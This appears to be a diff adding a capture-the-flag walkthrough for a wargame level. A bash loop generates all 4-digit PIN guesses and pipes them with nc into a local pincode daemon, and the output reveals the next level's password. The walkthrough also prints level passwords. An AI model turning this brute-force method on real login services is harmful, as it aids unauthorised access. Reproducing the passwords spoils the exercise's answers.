@@ -1,0 +1,39 @@
+Level Goal
+
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+
+bandit24:/tmp/24$ nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1234
+Wrong! Please enter the correct pincode. Try again.
+Shell script that generated the combination of password and pin
+bandit24:/tmp/24$ cat brute_force.sh
+#!/bin/bash
+for i in {1..10000}
+do
+ echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" >> ./out
+done
+bandit24:/tmp/24$ more out
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 2
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 3
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 4
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5
+<----snip---->
+bandit24:/tmp/24$ cat out | nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+<----snip---->
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+Exiting.
+bandit24:/tmp/24$
